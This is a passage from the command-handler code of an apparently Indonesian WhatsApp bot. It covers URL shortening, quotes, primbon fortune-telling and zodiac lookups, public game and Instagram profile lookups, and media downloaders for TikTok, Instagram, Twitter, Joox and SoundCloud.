                    caption: `⌗ Title : ${result.title}\n⌗ Source : ${result.source}\n⌗ Media Url : ${result.image}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tinyurl': case 'isgd': case 'vurl': case 'clp': {
            	if (!text) throw 'Masukkan Query Title'
                let anu = await fetchJson(`https://api.akuari.my.id/short/${command}?link=${text}`)
                let buttons = [
                    {buttonId: `hehehe`, buttonText: {displayText: '🙏THANKS'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.hasil,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            
//Pembatas========================================
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}' \n\nAnime : ${result.anime}\n\n- ${result.up_at}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': {
                let anu = await fetchJson(`https://kocakz.herokuapp.com/api/random/text/quotes`)
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.quote,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                MEYBotz.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6283845185968`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nomor HP :* ${anu.message.nomer_hp}\n⌗ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⌗ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⌗ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Mimpi :* ${anu.message.mimpi}\n⌗ *Arti :* ${anu.message.arti}\n⌗ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama Anda :* ${anu.message.nama_anda.nama}\n⌗ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⌗ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⌗ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⌗ *Hasil :* ${anu.message.result}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama Anda :* ${anu.message.nama_anda.nama}\n⌗ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⌗ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⌗ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⌗ *Hasil :* ${anu.message.result}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama Suami :* ${anu.message.suami.nama}\n⌗ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⌗ *Nama Istri :* ${anu.message.istri.nama}\n⌗ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⌗ *Hasil :* ${anu.message.result}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama Anda :* ${anu.message.nama_anda.nama}\n⌗ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⌗ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⌗ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⌗ *Sisi Positif :* ${anu.message.sisi_positif}\n⌗ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama :* ${anu.message.nama}\n⌗ *Arti :* ${anu.message.arti}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama :* ${anu.message.nama}\n⌗ *Lahir :* ${anu.message.tgl_lahir}\n⌗ *Life Path :* ${anu.message.life_path}\n⌗ *Destiny :* ${anu.message.destiny}\n⌗ *Destiny Desire :* ${anu.message.destiny_desire}\n⌗ *Personality :* ${anu.message.personality}\n⌗ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendImage(m.chat,  anu.message.gambar, `⌗ *Nama Anda :* ${anu.message.nama_anda}\n⌗ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⌗ *Sisi Positif :* ${anu.message.sisi_positif}\n⌗ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⌗ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Lahir :* ${anu.message.hari_lahir}\n⌗ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Lahir :* ${anu.message.hari_lahir}\n⌗ *Rezeki :* ${anu.message.rejeki}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Lahir :* ${anu.message.hari_lahir}\n⌗ *Pekerjaan :* ${anu.message.pekerjaan}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example❗:\n${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Analisa :* ${anu.message.analisa}\n⌗ *Angka Akar :* ${anu.message.angka_akar}\n⌗ *Sifat :* ${anu.message.sifat}\n⌗ *Elemen :* ${anu.message.elemen}\n⌗ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Analisa :* ${anu.message.analisa}\n⌗ *Sektor :* ${anu.message.sektor}\n⌗ *Elemen :* ${anu.message.elemen}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendImage(m.chat, anu.message.image, `⌗ *Lahir :* ${anu.message.tgl_lahir}\n⌗ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⌗ *Arti :* ${anu.message.arti}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika,1,2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama :* ${anu.message.nama}\n⌗ *Lahir :* ${anu.message.tahun_lahir}\n⌗ *Gender :* ${anu.message.jenis_kelamin}\n⌗ *Angka Kua :* ${anu.message.angka_kua}\n⌗ *Kelompok :* ${anu.message.kelompok}\n⌗ *Karakter :* ${anu.message.karakter}\n⌗ *Sektor Baik :* ${anu.message.sektor_baik}\n⌗ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Lahir :* ${anu.message.tgl_lahir}\n⌗ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⌗ *Info :* ${anu.message.info}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Lahir :* ${anu.message.tgl_lahir}\n⌗ *Hasil :* ${anu.message.result}\n⌗ *Info :* ${anu.message.info}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Hari Lahir :* ${anu.message.hari_lahir}\n⌗ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⌗ *Hari Naas :* ${anu.message.hari_naas}\n⌗ *Info :* ${anu.message.catatan}\n⌗ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Hari Lahir :* ${anu.message.hari_lahir}\n⌗ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⌗ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Hari Lahir :* ${anu.message.hari_lahir}\n⌗ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⌗ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka,7,7,2005,2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama :* ${anu.message.nama}\n⌗ *Lahir :* ${anu.message.tgl_lahir}\n⌗ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⌗ *Hasil :* ${anu.message.result}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Tanggal :* ${anu.message.tanggal}\n⌗ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⌗ *Watak Hari :* ${anu.message.watak_hari}\n⌗ *Naga Hari :* ${anu.message.naga_hari}\n⌗ *Jam Baik :* ${anu.message.jam_baik}\n⌗ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama :* ${anu.message.nama}\n⌗ *Lahir :* ${anu.message.tgl_lahir}\n⌗ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Nama :* ${anu.message.nama}\n⌗ *Lahir :* ${anu.message.tgl_lahir}\n⌗ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12,1,2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Hasil :* ${anu.message.result}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12,1,2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Hasil :* ${anu.message.result}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                MEYBotz.sendText(m.chat, `⌗ *Zodiak :* ${anu.message.zodiak}\n⌗ *Nomor :* ${anu.message.nomor_keberuntungan}\n⌗ *Aroma :* ${anu.message.aroma_keberuntungan}\n⌗ *Planet :* ${anu.message.planet_yang_mengitari}\n⌗ *Bunga :* ${anu.message.bunga_keberuntungan}\n⌗ *Warna :* ${anu.message.warna_keberuntungan}\n⌗ *Batu :* ${anu.message.batu_keberuntungan}\n⌗ *Elemen :* ${anu.message.elemen_keberuntungan}\n⌗ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⌗ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            
//PEMBATAS=======================================
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    MEYBotz.sendMedia(m.chat, anu.caption.profile_hd, '', `⌗ Full Name : ${anu.caption.full_name}\n⌗ User Name : ${anu.caption.user_name}\n⌗ ID ${anu.caption.user_id}\n⌗ Followers : ${anu.caption.followers}\n⌗ Following : ${anu.caption.following}\n⌗ Bussines : ${anu.caption.bussines}\n⌗ Profesional : ${anu.caption.profesional}\n⌗ Verified : ${anu.caption.verified}\n⌗ Private : ${anu.caption.private}\n⌗ Bio : ${anu.caption.biography}\n⌗ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`⌗ Name : ${anu.name}\n⌗ Version : ${Object.keys(anu.versions)}\n⌗ Created : ${tanggal(anu.time.created)}\n⌗ Modified : ${tanggal(anu.time.modified)}\n⌗ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n⌗ Description : ${anu.description}\n⌗ Homepage : ${anu.homepage}\n⌗ Keywords : ${anu.keywords}\n⌗ Author : ${anu.author.name}\n⌗ License : ${anu.license}\n⌗ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
            case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://anabotofc.herokuapp.com/api/download/tiktok2?url=${text}&apikey=AnaBot`)
                let buttons = [
                    {buttonId: `allmenu`, buttonText: {displayText: '⌕ List Menu'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowm },
                    caption: `Download From ${text}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 5
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
           /**case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://botcahx-rest-api.herokuapp.com/api/dowloader/tikok?url=${text}`)
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.video_original },
                    caption: `Download From ${text}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 5
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break**/
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://anabotofc.herokuapp.com/api/download/tiktok2?url=${text}&apikey=AnaBot`)
                let buttons = [
                    {buttonId: `allmenu`, buttonText: {displayText: '⌕ List Menu'}, type: 1},
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                MEYBotz.sendMessage(m.chat, { audio: { url: anu.result.nowm }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) MEYBotz.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    MEYBotz.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await MEYBotz.sendImage(m.chat, anu.result.img, `⌗ Title : ${anu.result.lagu}\n⌗ Album : ${anu.result.album}\n⌗ Singer : ${anu.result.penyanyi}\n⌗ Publish : ${anu.result.publish}\n⌗ Lirik :\n${anu.result.lirik.result}`, m)
                MEYBotz.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await MEYBotz.sendImage(m.chat, anu.result.thumb, `⌗ Title : ${anu.result.title}\n⌗ Url : ${isUrl(text)[0]}`)
                MEYBotz.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
